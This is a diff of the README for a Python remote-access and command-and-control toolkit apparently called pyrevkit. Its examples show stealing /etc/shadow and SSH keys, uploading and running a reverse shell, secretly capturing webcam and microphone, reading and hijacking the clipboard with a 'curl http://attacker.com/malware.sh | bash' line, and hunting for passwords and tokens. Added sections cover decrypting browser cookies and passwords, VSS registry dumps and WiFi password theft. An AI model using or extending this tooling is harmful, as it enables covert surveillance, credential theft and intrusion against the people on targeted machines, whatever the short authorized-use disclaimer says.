-total 48
-drwx------  5 root root 4096 Apr  3 10:30 .
-drwxr-xr-x 19 root root 4096 Mar 15 08:12 ..
--rw-------  1 root root  220 Mar 15 08:12 .bash_logout
-```
-
-### Example 2: Data Exfiltration
-
-```bash
->>> download /etc/passwd
-[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
-
->>> download /etc/shadow
-[✓] Downloaded shadow (1.89 KB) → loot/machineA_shadow
-
->>> download /home/user/.ssh/id_rsa
-[✓] Downloaded id_rsa (3.24 KB) → loot/machineA_id_rsa
-
->>> ls_loot
-Files in loot/:
-  - machineA_passwd (2.45 KB)
-  - machineA_shadow (1.89 KB)
-  - machineA_id_rsa (3.24 KB)
-```
-
-### Example 3: Payload Deployment
-
-```bash
->>> ls_payloads
-Files in payloads/:
-  - reverse_shell.sh (265 bytes)
-  - privilege_escalation.py (3.21 KB)
-
->>> upload reverse_shell.sh
-[✓] Saved reverse_shell.sh (0.26 KB) → downloads/reverse_shell.sh
-
->>> chmod +x downloads/reverse_shell.sh
-
->>> bash downloads/reverse_shell.sh 192.168.1.100 4444
-```
-
-### Example 4: Multi-Session Workflow
-
-Terminal 1 (Server):
-```bash
-$ python pyrev_server.py
-[+] Server running on wss://0.0.0.0:8765
-[+] Target machineA connected
-```
-
-Terminal 2 (Target):
-```bash
-$ python pyrev_target.py
-[+] Auto-connecting to 192.168.2.110:8765 as machineA
-[+] Connected and authenticated. Waiting for commands...
-```
-
-Terminal 3 (Operator 1):
-```bash
-$ python pyrev_client.py
->>> whoami
-root
->>> exit
-```
-
-Terminal 4 (Operator 2 - connects to same target):
-```bash
-$ python pyrev_client.py
->>> pwd
-/root
-```
-
-### Example 5: Media Surveillance
-
-```bash
-# Capture webcam photo
->>> webcam
-[✓] Webcam captured (156.78 KB) → loot/machineA_webcam_20260403_143022.jpg
-
-# Record 30 seconds of audio
->>> record 30
-[✓] Audio recorded (5.05 MB) → loot/machineA_audio_20260403_143522.wav
-
-# Check who's at the machine
-# Download and review the webcam image from loot/ directory
-```
-
-### Example 6: Credential Harvesting
-
-```bash
-# Search for SSH keys
->>> search id_rsa
-[✓] Found 3 results:
-  1. /home/john/.ssh/id_rsa (3.24 KB)
-  2. /home/admin/.ssh/id_rsa (2.98 KB)
-
-# Search for certificates
->>> search *.pem --limit 100
-[✓] Found 79 results:
-  1. /etc/ssl/private/server.pem (5.61 KB)
-  ...
-
-# Search for passwords in config files
->>> search --content "password" --limit 200
-[✓] Found 45 results:
-  1. /app/config.json:23
-     "database_password": "admin123"
-  2. /home/user/.bashrc:15
-     export DB_PASSWORD="secret"
-  ...
-
-# Download sensitive files
->>> download /home/john/.ssh/id_rsa
-[✓] Downloaded id_rsa (3.24 KB) → loot/machineA_id_rsa
-```
-
-### Example 7: System Profiling
-
-```bash
-# Gather complete system information
->>> sysinfo
-[✓] System Information - machineA
-System:
-  os: Windows 10
-  hostname: PROD-WEB-01
-  architecture: AMD64
-  
-Network:
-  local_ip: 192.168.1.100
-  
-Storage:
-  C: 50.2GB free / 512.0GB total
-
-# Search for interesting configuration files
->>> search *.conf --limit 50
->>> search config.json
->>> search settings.ini
-```
-
-### Example 8: Clipboard Monitoring
-
-```bash
-# Monitor clipboard for copied credentials
->>> clipboard
-[✓] Clipboard content:
-john.doe@example.com
-
-# Wait for user to copy password...
->>> clipboard
-[✓] Clipboard content:
-MySecretPassword123!
-
-# Replace clipboard with malicious payload
->>> clipboard set "curl http://attacker.com/malware.sh | bash"
-[✓] Clipboard updated
-```
-
-### Example 9: Complete Reconnaissance Workflow
-
-```bash
-# Step 1: System profiling
->>> sysinfo
-[✓] System Information collected
-
-# Step 2: Search for sensitive files
->>> search *.pem --limit 200
->>> search *.key --limit 100
->>> search id_rsa
-
-# Step 3: Search for credentials in files
->>> search --content "password" --limit 300
->>> search --content "api_key" --limit 200
->>> search --content "secret" --limit 200
-
-# Step 4: Media surveillance
->>> webcam
->>> record 60
-
-# Step 5: Clipboard monitoring
->>> clipboard
-
-# Step 6: Download everything found
->>> download /path/to/sensitive/file1
->>> download /path/to/sensitive/file2
-```
-
-### Example 10: Advanced Search Operations
-
-```bash
-# Find all log files
->>> search *.log --limit 500
-[✓] Found 342 results:
-  ...
-
-# Search for database connection strings
->>> search --content "mysql://" --limit 100
->>> search --content "postgresql://" --limit 100
->>> search --content "mongodb://" --limit 100
-
-# Find configuration files
->>> search *config* --limit 200
->>> search *.ini --limit 100
->>> search *.conf --limit 100
-
-# Search for API keys and tokens
->>> search --content "Bearer " --limit 150
->>> search --content "token" --limit 200
->>> search --content "Authorization:" --limit 100
-```
-
-## ⚙️ Configuration
-
-### Server Configuration
-
-Edit `pyrev_server.py` constants:
-
-```python
-LOOT_DIR = "loot"           # Directory for downloaded files
-PAYLOADS_DIR = "payloads"   # Directory for payloads to upload
-CREDS_FILE = "credentials.json"
-```
-
-### Target Configuration
-
-Edit `pyrev_target.py` header:
-
-```python
-TARGET_ID = "machineA"        # Unique identifier
-SERVER_HOST = "192.168.2.110" # C2 server address
-SERVER_PORT = 8765            # C2 server port
-AUTO_LOGIN = ""               # Set for autonomous mode
-AUTO_PASSWORD = ""            # Set for autonomous mode
-DOWNLOAD_DIR = "downloads"    # Received files directory
-```
-
-### Client Configuration
-
-Edit `pyrev_client.py` constants:
-
-```python
-OP_ID = "operator1"  # Operator identifier
-```
-
-## 🔒 Security Considerations
-
-### ⚠️ Important Warnings
-
-1. **For Educational/Authorized Use Only**: Only use on systems you own or have explicit permission to test
-2. **Credential Storage**: Passwords are hashed but stored on disk
-3. **SSL Certificate**: Use valid certificates in production
-4. **Network Security**: Consider firewall rules and network segmentation
-
-### Security Features
-
-✅ **TLS/SSL Encryption**: All traffic encrypted via WSS  
-✅ **Password Hashing**: PBKDF2-SHA256 with 100,000 iterations  
-✅ **Salt per User**: Unique 32-byte salt prevents rainbow tables  
-✅ **Timing Attack Protection**: Constant-time comparison  
-✅ **Command Timeout**: 30-second limit on command execution  
-✅ **File Size Limits**: 10MB maximum file transfer size  
-
-### Recommendations
-
-- Use strong, unique passwords (16+ characters)
-- Rotate credentials regularly
-- Use firewall rules to restrict server access
-- Monitor server logs for suspicious activity
-- Use valid SSL certificates (not self-signed) in production
-- Set restrictive file permissions: `chmod 600 credentials.json`
 
 ## 🐛 Troubleshooting
 
-### Connection Issues
+### VSS Issues
 
-**Problem**: `[ERROR] Connection rejected`
+**Problem**: "VSS creation failed"
+- **Cause**: Not running as Administrator
+- **Fix**: Ensure target has admin privileges
 
-**Solution**:
-```bash
-# Verify server is running
-netstat -tulpn | grep 8765
+**Problem**: "Database locked" (browser data)
+- **Cause**: Browser running but VSS failed
+- **Fix**: Check VSS service is enabled: `net start vss`
 
-# Check firewall
-sudo ufw allow 8765/tcp
+### Cookie Decryption Issues
 
-# Verify certificate exists
-ls -l server.pem
-```
+**Problem**: "Cannot decrypt v20 cookies"
+- **Not a bug**: v20 App-Bound encryption cannot be bypassed
+- **Workaround**: Use browser export methods (see v20 section)
 
-**Problem**: `cannot call recv while another coroutine is running`
+**Problem**: "Missing libraries (pycryptodome, pywin32)"
+- **Fix**: `pip install pycryptodome pywin32`
+- **Impact**: Cookies show `[Encrypted]` instead of decrypted
 
-**Solution**: Server automatically handles this by cancelling old relays. Update to latest version.
+**Problem**: All cookies show "[v20 App-Bound]"
+- **Expected**: Modern Edge/Chrome use v20 encryption
+- **Solution**: Use browser extensions or DevTools export
 
-### Authentication Issues
+### Desktop Streaming Issues
 
-**Problem**: `Authentication failed`
+**Problem**: Stream frames not showing/saving
+- **Fix**: Ensure `mss pillow` installed: `pip install mss pillow`
+- **Check**: Verify `loot/` directory exists
 
-**Solution**:
-```bash
-# Verify credentials exist
-cat credentials.json
+**Problem**: "Cannot run commands while streaming"
+- **Not a bug**: Concurrent commands are supported
+- **Check**: Update to latest version
 
-# Re-add credentials
-python pyrev_server.py -creds target machineA NewPassword123
+### File Download Issues
 
-# Check for typos in login/password
-```
+**Problem**: "File too large"
+- **Fix**: Files >10MB rejected. Compress: `tar -czf archive.tar.gz files/`
 
-### File Transfer Issues
+**Problem**: "File not found"
+- **Fix**: Verify file exists on target: `ls /path/to/file`
 
-**Problem**: `[✗] File not found`
+### General Issues
 
-**Solution**:
-```bash
-# For download: verify file exists on target
->>> ls /path/to/file
+**Problem**: Connection timeouts
+- **Check**: Firewall rules allow port 8765
+- **Check**: SSL certificate matches server IP
+- **Fix**: Regenerate certificate with correct IP
 
-# For upload: verify file in payloads/
-ls -l payloads/
-```
-
-**Problem**: `[✗] File too large`
-
-**Solution**: Files over 10MB are rejected. Compress or split the file:
-```bash
-# On target
-tar -czf archive.tar.gz large_directory/
->>> download archive.tar.gz
-```
-
-### Media Capture Issues
-
-**Problem**: `[✗] OpenCV not installed`
-
-**Solution**:
-```bash
-# On target machine
-pip install opencv-python
-```
-
-**Problem**: `[✗] Cannot access webcam`
-
-**Solutions**:
-- Close other applications using the webcam
-- Verify webcam is connected: `ls /dev/video*` (Linux)
-- Check user permissions: `sudo usermod -a -G video $USER` (Linux)
-
-**Problem**: `[✗] Audio libraries not installed`
-
-**Solution**:
-```bash
-# On target machine
-pip install sounddevice scipy numpy
-
-# Linux may also need
-sudo apt-get install portaudio19-dev python3-dev
-```
-
-**Problem**: Audio recording fails or is silent
-
-**Solutions**:
-- Check microphone is not muted
-- Verify default audio device: `python -c "import sounddevice as sd; print(sd.query_devices())"`
-- Test manually: Run `test_media.py` script
-
-### Search Issues
-
-**Problem**: No results found when files clearly exist
-
-**Solutions**:
-- Check file permissions (target may not have access)
-- Increase limit: `search *.pdf --limit 500`
-- Verify pattern syntax (case-insensitive)
-- Try broader pattern: `search *password*`
-
-**Problem**: Content search returns too many results
-
-**Solutions**:
-- Use more specific search term
-- Adjust limit: `search --content "exact_phrase" --limit 50`
-
-**Problem**: Search is slow
-
-**Solution**: This is normal for large filesystems. Consider:
-- Reducing limit: `--limit 100`
-- Searching specific file types only
-- Being more specific with patterns
-
-### Clipboard Issues
-
-**Problem**: `[✗] Clipboard library not installed`
-
-**Solution**:
-```bash
-# On target machine
-pip install pyperclip
-```
-
-**Problem**: `[✗] Clipboard read timeout`
-
-**Solutions**:
-- **Linux**: Install clipboard tools
-  ```bash
-  sudo apt-get install xclip  # For X11
-  sudo apt-get install wl-clipboard  # For Wayland
-  ```
-- Verify graphical environment: `echo $DISPLAY` (should show `:0` or similar)
-- Not supported on headless servers
-
-**Problem**: Clipboard command hangs
-
-**Solution**: 
-- Update to latest version (timeout protection added)
-- Run diagnostic: `python test_clipboard.py` on target
-- Ensure target is not headless
-
-**Problem**: Clipboard works but returns empty
-
-**Solutions**:
-- Clipboard is actually empty
-- Clipboard contains non-text data (images, files)
-- Copy some text manually and try again
-
-### System Information Issues
-
-**Problem**: Some information missing in sysinfo output
-
-**Solution**: This is normal. Information availability depends on:
-- Operating system
-- User permissions
-- Python version
-
-No fix needed - system provides what it can access.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please follow these guidelines:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+**Problem**: Authentication failed
+- **Fix**: Verify credentials in `credentials.json`
+- **Reset**: `python pyrev_server.py -creds operator admin newpass`
 
 ## 📄 License
 
@@ -1100,38 +645,14 @@ This tool is provided for educational and authorized security testing purposes o
 ## 📚 Additional Resources
 
 ### Documentation
-- [MEDIA_CAPTURE.md](MEDIA_CAPTURE.md) - Complete guide for webcam and audio features
-- [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md) - File search, sysinfo, and clipboard documentation
-- [CLIPBOARD_TROUBLESHOOTING.md](CLIPBOARD_TROUBLESHOOTING.md) - Comprehensive clipboard troubleshooting
-- [QUICKREF.md](QUICKREF.md) - Quick reference guide for all commands
+- [CREDENTIAL_HARVESTING.md](CREDENTIAL_HARVESTING.md) - Complete credential harvesting guide
+- [SYSINFO_ENHANCED.md](SYSINFO_ENHANCED.md) - Enhanced system information guide
+- [MEDIA_CAPTURE.md](MEDIA_CAPTURE.md) - Webcam and audio features
+- [QUICKREF.md](QUICKREF.md) - Quick reference guide
 
-### Testing Tools
-- `test_media.py` - Test webcam and audio capabilities
-- `test_clipboard.py` - Diagnose clipboard functionality
-
-### Dependencies Reference
-
-**Core (required):**
-```bash
-pip install websockets>=12.0
-```
-
-**Media Capture (optional):**
-```bash
-pip install opencv-python>=4.5.0      # Webcam
-pip install sounddevice>=0.4.6        # Audio
-pip install scipy>=1.7.0 numpy>=1.21.0  # Audio processing
-```
-
-**Advanced Features (optional):**
-```bash
-pip install pyperclip>=1.8.0          # Clipboard
-```
-
-**All optional features:**
-```bash
-pip install -r requirements-advanced.txt
-```
+### External Tools
+- [Impacket secretsdump](https://github.com/fortra/impacket) - Registry hash extraction
+- [ESEDatabaseView](https://www.nirsoft.net/utils/ese_database_view.html) - Windows Mail database viewer
 
 ### Protocol Specifications
 - [PBKDF2 Specification](https://tools.ietf.org/html/rfc2898)
@@ -1140,47 +661,39 @@ pip install -r requirements-advanced.txt
 
 ## 🎯 Complete Feature Matrix
 
-| Feature | Dependencies | Platforms | Status |
-|---------|--------------|-----------|--------|
+| Feature | Dependencies | Windows | Linux | macOS | Notes |
+|---------|-------------|---------|-------|-------|-------|
 | **Core Features** |
-| Shell Commands | None | All | ✅ |
-| File Transfer | None | All | ✅ |
-| Authentication | None | All | ✅ |
-| Auto-Reconnect | None | All | ✅ |
-| **Media Capture** |
-| Webcam | opencv-python | All* | ✅ |
-| Audio Recording | sounddevice, scipy, numpy | All* | ✅ |
+| Shell Commands | None | ✅ | ✅ | ✅ | - |
+| File Transfer | None | ✅ | ✅ | ✅ | - |
+| Authentication | None | ✅ | ✅ | ✅ | - |
+| **Desktop Surveillance** |
+| Screenshot | mss, pillow | ✅ | ✅ | ✅ | - |
+| Desktop Streaming | mss, pillow | ✅ | ✅ | ✅ | Concurrent commands |
+| Webcam | opencv-python | ✅ | ✅* | ✅* | *Permissions required |
+| Audio Recording | sounddevice, scipy, numpy | ✅ | ✅* | ✅* | *Permissions required |
+| **Browser Extraction** |
+| History/Bookmarks/Downloads | None | ✅ | ✅ | ✅ | - |
+| Cookies with Decryption | pycryptodome, pywin32 | ✅ | ✅ | ✅ | v20 limitation |
+| VSS Fallback | Admin rights | ✅ | ❌ | ❌ | Windows only |
+| **Credential Harvesting** |
+| Browser Passwords | pycryptodome, pywin32 | ✅ | ✅ | ✅ | v20 limitation |
+| Registry Dump via VSS | Admin rights | ✅ | ❌ | ❌ | Windows only |
+| WiFi Passwords | None | ✅ | ✅ | ❌ | - |
+| Windows Mail Export | Admin rights | ✅ | ❌ | ❌ | VSS required |
+| Application Creds | None | ✅ | ✅ | ✅ | Enumeration only |
+| **File Operations** |
+| Smart Exfiltration | None | ✅ | ✅ | ✅ | - |
+| File Search | None | ✅ | ✅ | ✅ | - |
 | **Reconnaissance** |
-| File Search | None | All | ✅ |
-| Content Search | None | All | ✅ |
-| System Info | None | All | ✅ |
-| Clipboard | pyperclip | GUI only** | ✅ |
-
-\* Camera/microphone must be available  
-\*\* Requires graphical environment (not headless)
-
-### Platform-Specific Notes
-
-**Windows:**
-- All features work out of the box after installing dependencies
-- Clipboard works without additional tools
-- Webcam LED may turn on during capture
-
-**Linux:**
-- Webcam requires user in `video` group
-- Audio requires user in `audio` group  
-- Clipboard requires `xclip` (X11) or `wl-clipboard` (Wayland)
-- Headless servers: media and clipboard features unavailable
-
-**macOS:**
-- All features work natively
-- First use requires permission prompts (webcam, microphone, clipboard)
-- Clipboard uses native `pbcopy`/`pbpaste`
+| Enhanced Sysinfo | None | ✅ | ✅ | ✅ | - |
+| Clipboard | pyperclip | ✅ | ✅** | ✅ | **GUI required |
 
 ## 🙏 Acknowledgments
 
 - Built with Python's `asyncio` and `websockets` libraries
-- Inspired by modern C2 frameworks
+- VSS integration inspired by offensive security research
+- Cookie decryption research from browser security community
 - Thanks to the security research community
 
 ---
@@ -1190,3 +703,8 @@ pip install -r requirements-advanced.txt
 **📧 Contact**: your.email@example.com  
 **🐛 Issues**: [GitHub Issues](https://github.com/yourusername/pyrevkit/issues)  
 **💬 Discussions**: [GitHub Discussions](https://github.com/yourusername/pyrevkit/discussions)
+
+---
+
+**Version**: 0.5 (Beta)
+**Last Updated**: 2026-04-06
